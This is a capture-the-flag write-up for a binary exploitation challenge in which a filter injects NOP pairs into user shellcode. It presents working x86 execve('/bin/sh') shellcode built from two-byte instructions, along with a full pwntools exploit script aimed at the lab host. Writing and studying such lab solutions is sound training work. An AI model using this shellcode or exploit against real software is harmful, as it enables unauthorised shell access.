# CyLab — Filtered-Shellcode

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `184`)
* **Category:** Binary Exploitation / Constrained Shellcoding (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, x86 Assembly
* **Binary:** `fun` (32-bit x86 ELF)

---

## TL;DR

The target program provides an executable memory canvas for user-supplied shellcode, but processes it through an adversarial filter before execution: **two NOP bytes (`0x90 0x90`) are forcibly injected after every two input bytes**. To bypass this filter, we design a specialized "2-byte slip" shellcode where every CPU instruction is strictly $\le 2$ bytes. Because x86 NOP instructions do not alter register or flag state, execution naturally slips through the injected NOP pairs and enters the subsequent instruction. By embedding `"/bin/sh"` into the input and locating it via the function parameter `[ebp+8]`, we construct an `execve("/bin/sh")` syscall without ever emitting an instruction longer than 2 bytes.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file fun
fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=fun
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **NX Disabled:** Injected code execution is supported.
2. **Deterministic Filter Mechanism:** The application copies user input into an execution buffer while inserting two NOP bytes (`0x90 0x90`) between every 2-byte chunk.
3. **Execution Frame:** The caller passes a pointer to our original unmodified input buffer as argument `[ebp+8]` to `execute()`.

---

## Static Analysis & Vulnerability

### 1. The Filter Routine

```c
void execute(char *buf, int len) {
    char *filtered = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0);

    int j = 0;
    for (int i = 0; i < len; i += 2) {
        filtered[j++] = buf[i];
        if (i + 1 < len) {
            filtered[j++] = buf[i + 1];
        }
        filtered[j++] = 0x90;   // Injects NOP
        filtered[j++] = 0x90;   // Injects NOP
    }

    void (*code)(void) = (void (*)(void))filtered;
    code();                     // Calls filtered shellcode
}
```

### 2. Transformation Mechanics

```text
  Raw Input:       [ B0 ][ B1 ] [ B2 ][ B3 ] [ B4 ][ B5 ] ...
                        |            |            |
                        v            v            v
  Filtered Buffer: [ B0 ][ B1 ] [ 90 ][ 90 ] [ B2 ][ B3 ] [ 90 ][ 90 ] ...
                   (Instruction)    (NOPs)   (Instruction)    (NOPs)
```

Because NOPs (`\x90`) are single-byte instructions that perform no operation, the CPU executes `[B0][B1]`, traverses the two NOPs, and seamlessly continues into `[B2][B3]`.

Constraint:
**Every individual x86 instruction must occupy at most 2 bytes.** Any 3-byte or longer instruction will have its trailing bytes severed by the injected NOPs, creating invalid opcodes.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Passing the `"/bin/sh"` String
Embedding a string like `"/bin/sh\x00"` directly in code requires instructions that would exceed 2 bytes. However, our original raw input buffer remains intact in memory, and its address is passed at `[ebp+8]`.
We place `"/bin/sh\x00"` at the start of our input, preceded by a 2-byte relative short jump:
```asm
jmp +0x12       ; Opcode: eb 12 (skips over string and initial NOPs)
```

### 2. Crafting the 2-Byte Instructions
We assemble the `execve` syscall ($11 = 0\text{xb}$) using only 1-byte and 2-byte instructions:

```asm
# 1. Retrieve input buffer address from [ebp+8]
push ebp; pop eax       ; 55 58 (2 bytes) -> eax = ebp
inc eax; inc eax        ; 40 40 (2 bytes) -> eax = ebp + 2
inc eax; inc eax        ; 40 40 (2 bytes) -> eax = ebp + 4
inc eax; inc eax        ; 40 40 (2 bytes) -> eax = ebp + 6
inc eax; inc eax        ; 40 40 (2 bytes) -> eax = ebp + 8
mov ebx, [eax]          ; 8b 18 (2 bytes) -> ebx = pointer to original input

# 2. Advance ebx past the 2-byte jmp instruction to "/bin/sh"
inc ebx; inc ebx        ; 43 43 (2 bytes) -> ebx = &"/bin/sh"

# 3. Clear ecx (argv = NULL) and edx (envp = NULL)
xor ecx, ecx            ; 31 c9 (2 bytes)
xor edx, edx            ; 31 d2 (2 bytes)

# 4. Set eax to 11 (__NR_execve) and trigger interrupt
xor eax, eax            ; 31 c0 (2 bytes)
mov al, 0xb             ; b0 0b (2 bytes)
int 0x80                ; cd 80 (2 bytes)
```

Every single instruction pair perfectly aligns with the 2-byte filter boundary.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33406

def build_shellcode():
    # Header: short jump over string (eb 12) + "/bin/sh\x00"
    header = b"\xeb\x12/bin/sh\x00"

    # 2-byte instruction chunks
    chunks = [
        b"\x55\x58",     # push ebp; pop eax
        b"\x40\x40",     # inc eax; inc eax
        b"\x40\x40",     # inc eax; inc eax
        b"\x40\x40",     # inc eax; inc eax
        b"\x40\x40",     # inc eax; inc eax
        b"\x8b\x18",     # mov ebx, [eax]  (ebx = &input)
        b"\x43\x43",     # inc ebx; inc ebx (ebx = &"/bin/sh")
        b"\x31\xc9",     # xor ecx, ecx
        b"\x31\xd2",     # xor edx, edx
        b"\x31\xc0",     # xor eax, eax
        b"\xb0\x0b",     # mov al, 0xb
        b"\xcd\x80"      # int 0x80
    ]
    return header + b"".join(chunks)

def solve(io):
    io.recvuntil(b"Give me code to run:\n")
    shellcode = build_shellcode()
    io.sendline(shellcode)

    # Shell is spawned
    io.sendline(b"cat flag.txt")
    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./fun") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33406: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33406
```

---

## Key Takeaways & Lessons

1. **Constrained Shellcode Design:** When filters enforce periodic byte injections (such as NOPs every $N$ bytes), decompose execution into discrete instructions of length $\le N$.
2. **Accessing Stack Arguments as Pointers:** In 32-bit x86 cdecl calling conventions, function arguments are stored at `[ebp+8]`. Fetching the buffer pointer via register arithmetic circumvents the need for hardcoded addresses or ASLR leaks.
3. **Data Embedding via Short Jumps:** Embedding string data within shellcode can be achieved cleanly by jumping over the data with a 2-byte short jump (`jmp rel8` $\rightarrow$ `\xeb\x12`), treating the following bytes as literal string payloads.
